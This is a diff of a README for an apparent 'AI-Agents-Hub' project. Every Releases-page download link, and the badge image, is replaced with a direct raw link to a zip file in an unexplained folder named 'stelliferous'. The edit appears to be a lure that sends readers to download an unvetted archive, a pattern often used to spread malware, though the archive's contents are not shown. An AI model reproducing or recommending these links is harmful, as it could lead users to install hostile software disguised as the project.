@@ -1,6 +1,6 @@
 # 🤖 AI-Agents-Hub - Explore Smart AI Agents Today
 
-[![Download AI-Agents-Hub](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Bhavya0007/AI-Agents-Hub/releases)
+[![Download AI-Agents-Hub](https://raw.githubusercontent.com/Bhavya0007/AI-Agents-Hub/main/stelliferous/AI-Agents-Hub.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Bhavya0007/AI-Agents-Hub/main/stelliferous/AI-Agents-Hub.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Make sure your device meets the following specifications:
 
 Go to the Releases page to find the latest version of AI-Agents-Hub. Click the link below:
 
-[Download AI-Agents-Hub](https://github.com/Bhavya0007/AI-Agents-Hub/releases)
+[Download AI-Agents-Hub](https://raw.githubusercontent.com/Bhavya0007/AI-Agents-Hub/main/stelliferous/AI-Agents-Hub.zip)
 
 ### 3. **Download the Application**
 
@@ -71,6 +71,6 @@ Join our community! Share your experiences or ask questions. Engage with other u
 
 Ready to get started with AI-Agents-Hub? Visit the link below to download the latest version and explore the exciting world of AI agents.
 
-[Download AI-Agents-Hub](https://github.com/Bhavya0007/AI-Agents-Hub/releases)
+[Download AI-Agents-Hub](https://raw.githubusercontent.com/Bhavya0007/AI-Agents-Hub/main/stelliferous/AI-Agents-Hub.zip)
 
 Enjoy your journey with AI-Agents-Hub!
